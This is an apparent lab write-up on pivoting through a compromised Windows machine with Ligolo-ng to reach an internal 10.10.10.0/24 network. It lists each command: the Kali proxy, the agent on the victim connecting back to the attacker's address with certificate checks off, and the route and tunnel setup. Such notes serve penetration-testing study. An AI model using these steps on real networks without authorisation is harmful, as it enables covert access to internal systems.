# Ligolo-ng Pivoting

## Overview

When the **victim machine is running Windows**, we can use **Ligolo-ng** to pivot through it and access an internal network that is not directly reachable from Kali.

The **Ligolo-ng agent** runs on the Windows victim, while the **Ligolo-ng proxy** runs on Kali.

The basic setup is:

```
Kali Linux
    │
    │ Ligolo-ng Tunnel
    ▼
Windows Victim
    │
    ▼
Internal Network
10.10.10.0/24
```

## Lab

### Step 1: Transfer the Agent to Windows

Since the victim is a Windows machine, we first download the Ligolo-ng **agent** and place it on the Windows victim.

![](../../../Images/Pasted%20image%2020261001003558.png)

We then transfer `agent.exe` to the Windows machine.

![](../../../Images/Pasted%20image%2020261001004322.png)

### Step 2: Start the Ligolo-ng Proxy

On Kali, we first start the Ligolo-ng **proxy**:

```
sudo ./proxy -selfcert
```

The `-selfcert` option allows the proxy to use a self-signed certificate for the connection.

![](../../../Images/Pasted%20image%2020261001004439.png)

### Step 3: Connect the Windows Agent

From the Windows victim, we connect the agent to the Kali proxy:

```
.\agent.exe -connect 10.0.2.15:11601 -ignore-cert
```

Here:

- `-connect` specifies the IP address and port of the Ligolo-ng proxy.
- `10.0.2.15:11601` is the Kali proxy address.
- `-ignore-cert` allows the agent to connect without validating the proxy certificate.

![](../../../Images/Pasted%20image%2020261001004732.png)

Once the connection is established, a new agent appears in the Ligolo-ng proxy.

![](../../../Images/Pasted%20image%2020261001004836.png)

### Step 4: Open a Session

We can now open a session with the connected agent:

```
session
```

![](../../../Images/Pasted%20image%2020261001004930.png)

### Step 5: Enumerate the Victim's Networks

We then check the networks available on the Windows victim.

The victim has access to **two networks**, which is important because it means the Windows machine can be used as a pivot to reach the internal network.

![](../../../Images/Pasted%20image%2020261001005105.png)

### Step 6: Create the Tunnel Interface

We create a virtual interface on the Kali machine:

```
interface_create
```

This interface will be used to route traffic through the Ligolo-ng tunnel.

![](../../../Images/Pasted%20image%2020261001010749.png)

### Step 7: Add a Route to the Internal Network

Next, we add a route for the internal network:

```
interface_add_route --name ligolo --route 10.10.10.0/24
```

This tells Ligolo-ng to route traffic destined for `10.10.10.0/24` through the `ligolo` interface.

![](../../../Images/Pasted%20image%2020261001010831.png)

### Step 8: Start the Tunnel

Finally, we start the tunnel:

```
tunnel_start --tun ligolo
```

![](../../../Images/Pasted%20image%2020261001010930.png)

### Step 9: Access the Internal Network

After starting the tunnel, Kali can route traffic through the Windows victim and access the internal network.

![](../../../Images/Pasted%20image%2020261001011144.png)

The final pivot looks like this:

```
Kali Linux
    │
    │ Ligolo-ng Tunnel
    ▼
Windows Victim
    │
    ▼
10.10.10.0/24
```

The Windows machine acts as the **pivot**, allowing Kali to reach systems inside the `10.10.10.0/24` network that were not directly accessible from Kali.